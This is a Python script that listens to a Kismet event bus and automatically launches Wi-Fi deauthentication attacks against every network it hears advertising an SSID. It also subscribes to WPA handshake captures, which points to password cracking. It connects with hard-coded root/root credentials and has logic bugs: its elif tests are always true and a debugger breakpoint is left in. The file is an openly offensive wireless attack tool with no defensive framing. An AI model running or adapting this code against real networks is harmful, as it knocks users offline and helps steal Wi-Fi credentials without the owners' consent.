import websocket
import deauthenticator
import json
import pdb


def got_message(msg):
    message = msg['MESSAGE']['kismet.messagebus.message_string']

    if "advertising" in message:
        root, ssid = message.split("advertising SSID")
        device_type, mac = root.split("device")
        print(f"Advertising: {ssid} on {mac}")
        deauthenticator.deauth("wlan1", 1, ssid, mac)
        
    elif "access point" in message:
        _, access_point = message.split("access point")
        print(f"Access point: {access_point}")
        pdb.set_trace()

def advertised_ssid(msg):
    print(msg)

def wpa_handshake(msg):
    print(f"Handshake: {msg}")

def response_ssid(msg):
    pass

def probed_ssid(msg):
    pass

def on_message(ws, message):
    msg = json.loads(message)
    keys = msg.keys()

    print(keys)

    if "MESSAGE" in keys:
        got_message(msg)

    elif "DOT11_ADVERTISED_SSID":
        advertised_ssid(msg)

    elif "DOT11_WPA_HANDSHAKE":
        wpa_handshake(msg)

    elif "DOT11_RESPONSE_SSID":
        response_ssid(msg)

    elif "DOT11_PROBED_SSID":
        probed_ssid(msg)

def on_error(ws, error):
    print(error)

def on_close(ws, close_status_code, close_msg):
    print("##closed##")

def on_open(ws):
    print("[-] on_open")

    req = {}
    req['SUBSCRIBE'] = "MESSAGE"
    ws.send(json.dumps(req))

    req = {}
    req['SUBSCRIBE'] = "DOT11_WPA_HANDSHAKE"
    ws.send(json.dumps(req))

    req = {}
    req['SUBSCRIBE'] = "DOT11_ADVERTISED_SSID"
    ws.send(json.dumps(req))

    req = {}
    req['SUBSCRIBE'] = "DOT11_RESPONSE_SSID"
#    ws.send(json.dumps(req))

    req = {}
    req['SUBSCRIBE'] = "DOT11_PROBED_SSID"
#    ws.send(json.dumps(req))

if __name__ == "__main__":
    print("Starting...")
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp("ws://127.0.0.1:2501/eventbus/events.ws?user=root&password=root",
                on_open=on_open,
                on_message=on_message,
                on_error=on_error,
                on_close=on_close)

    ws.run_forever()
